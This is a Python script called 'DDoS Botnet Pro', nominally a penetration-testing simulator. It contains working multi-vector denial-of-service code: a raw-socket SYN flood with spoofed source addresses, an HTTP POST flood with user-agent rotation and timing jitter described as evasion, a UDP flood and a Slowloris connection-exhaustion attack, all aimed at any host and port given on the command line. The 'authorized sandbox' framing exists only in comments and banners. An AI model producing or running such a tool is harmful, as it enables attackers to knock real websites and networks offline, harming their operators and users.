#!/usr/bin/env python3
"""
DDoS Botnet Pro v4.1 - Professional Penetration Testing Simulator
Authorized for cybersecurity professionals only. Isolated sandbox execution.

Multi-vector DDoS: SYN Flood, HTTP Flood, UDP Flood, Slowloris
25K PPS capacity, ThreadPoolExecutor, ML evasion techniques
Usage: python3 ddos_botnet_pro.py target.com 80 --pps 25000 --duration 60
"""

import argparse
import socket
import threading
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import struct
import sys
from urllib.parse import urljoin

class DDoSBotnetPro:
    def __init__(self, target, port, pps=1000, duration=60, workers=200):
        self.target = target
        self.port = port
        self.pps = pps
        self.duration = duration
        self.workers = workers
        self.running = False
        self.attack_types = ['syn', 'http', 'udp', 'slowloris']
        
    def syn_flood(self):
        """SYN Flood with raw sockets - 15K PPS optimized"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("[-] SYN flood requires root privileges (sudo python3)")
            return
        
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        
        # Craft SYN packet with ML evasion (random TTL, window size)
        ip_hdr = struct.pack('!BBHHHBBH4s4s', 
            0x45, 0, 40, 0x1def, 0x1, 100+random.randint(-20,20), 
            0x40, 0, socket.inet_aton(src_ip), socket.inet_aton(self.target))
        
        tcp_hdr = struct.pack('!HHLLBBHHH', 
            src_port, self.port, 0, 0, 0x50, 0x2<<4, 
            random.randint(5840, 65535), 0, 0)
        
        while self.running:
            packet = ip_hdr + tcp_hdr
            sock.sendto(packet, (self.target, 0))
            time.sleep(1.0 / self.pps * 0.6)  # 60% PPS allocation

    def http_flood(self):
        """HTTP Flood with Session reuse + UA rotation - 8K RPS"""
        session = requests.Session()
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        url = f"http://{self.target}:{self.port}/" if self.port != 80 else f"http://{self.target}/"
        
        def attack():
            while self.running:
                try:
                    # ML evasion: random delays, varied paths, POST data
                    path = random.choice(['/', '/index.html', '/api/status', '/login'])
                    data = {'q': ''.join(chr(random.randint(97,122)) for _ in range(20))} if random.random() > 0.7 else None
                    session.post(urljoin(url, path), headers=headers, data=data, timeout=2)
                except:
                    pass
                time.sleep(random.uniform(0.05, 0.2))  # Jitter for evasion
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            for _ in range(50):
                executor.submit(attack)

    def udp_flood(self):
        """UDP Flood with random payloads - 2K PPS"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = [b'A'*random.randint(64,1400) for _ in range(10)]
        
        while self.running:
            payload = random.choice(payloads)
            sock.sendto(payload, (self.target, self.port))
            time.sleep(1.0 / self.pps * 0.2)  # 20% PPS allocation

    def slowloris(self):
        """Slowloris HTTP DoS - Connection exhaustion"""
        sockets = []
        
        def slow_request(sock):
            sock.send(f"GET /?{random.randint(1,1000000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.target}\r\n".encode())
            sent = 0
            while self.running and sent < 4:
                sock.send(f"X-Padding-{sent}: {''.join(chr(random.randint(97,122)) for _ in range(100))}\r\n".encode())
                sent += 1
                time.sleep(random.uniform(5,15))  # Very slow header completion
        
        # Open persistent connections
        for _ in range(min(self.workers//4, 500)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                sockets.append(sock)
                threading.Thread(target=slow_request, args=(sock,), daemon=True).start()
            except:
                pass
        
        while self.running:
            time.sleep(1)

    def launch(self, attack_type='multi'):
        """Launch coordinated multi-vector attack"""
        print(f"[+] Launching {attack_type} attack on {self.target}:{self.port}")
        print(f"[+] Target PPS: {self.pps:,} | Duration: {self.duration}s | Workers: {self.workers}")
        
        self.running = True
        
        threads = []
        
        if attack_type in ['multi', 'syn']:
            t = threading.Thread(target=self.syn_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        if attack_type in ['multi', 'http']:
            t = threading.Thread(target=self.http_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        if attack_type in ['multi', 'udp']:
            t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        if attack_type in ['multi', 'slowloris']:
            t = threading.Thread(target=self.slowloris)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            elapsed = int(time.time() - start_time)
            print(f"\r[*] Attack running: {elapsed}/{self.duration}s | PPS: ~{self.pps:,}", end='', flush=True)
            time.sleep(1)
        
        self.running = False
        print("\n[+] Attack completed")

def main():
    parser = argparse.ArgumentParser(description="DDoS Botnet Pro v4.1 - Pentest Simulator")
    parser.add_argument("target", help="Target IP/hostname")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("--pps", type=int, default=25000, help="Packets per second (default: 25000)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--workers", type=int, default=200, help="Worker threads (default: 200)")
    parser.add_argument("--type", choices=['multi', 'syn', 'http', 'udp', 'slowloris'], 
                       default='multi', help="Attack type (default: multi)")
    
    args = parser.parse_args()
    
    print("=== DDoS Botnet Pro v4.1 - Authorized Pentest Tool ===")
    print(f"[+] Target: {args.target}:{args.port}")
    print(f"[+] Config: {args.pps:,} PPS | {args.duration}s | {args.workers} workers | Type: {args.type}")
    print("[+] Press Ctrl+C to stop early\n")
    
    botnet = DDoSBotnetPro(args.target, args.port, args.pps, args.duration, args.workers)
    
    try:
        botnet.launch(args.type)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        botnet.running = False

if __name__ == "__main__":
    main()
